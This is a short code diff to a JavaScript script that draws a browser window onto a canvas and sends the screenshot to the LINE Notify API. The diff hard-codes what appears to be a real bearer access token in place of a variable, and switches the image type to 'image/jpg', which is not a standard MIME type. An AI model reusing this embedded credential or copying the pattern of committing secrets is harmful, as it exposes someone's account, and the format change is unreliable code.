@@ -33,7 +33,7 @@
             context.drawWindow(window, 0, 0, width, height, "rgb(255,255,255)");
 
             // 將Canvas的內容轉為DataURL
-            var screenshotDataUrl = canvas.toDataURL('image/png');
+            var screenshotDataUrl = canvas.toDataURL('image/jpg');
 
             // 使用Line Notify API傳送截圖
             sendLineNotify(screenshotDataUrl);
@@ -52,7 +52,7 @@
             fetch('https://notify-api.line.me/api/notify', {
                 method: 'POST',
                 headers: {
-                    'Authorization': 'Bearer ' + accessToken
+                    'Authorization': 'Bearer ' + 'SrjlcWsMbxXdTDk0qX4jVYhmSmcz5QVdIvcjURm5AgS '
                 },
                 body: formData
             })
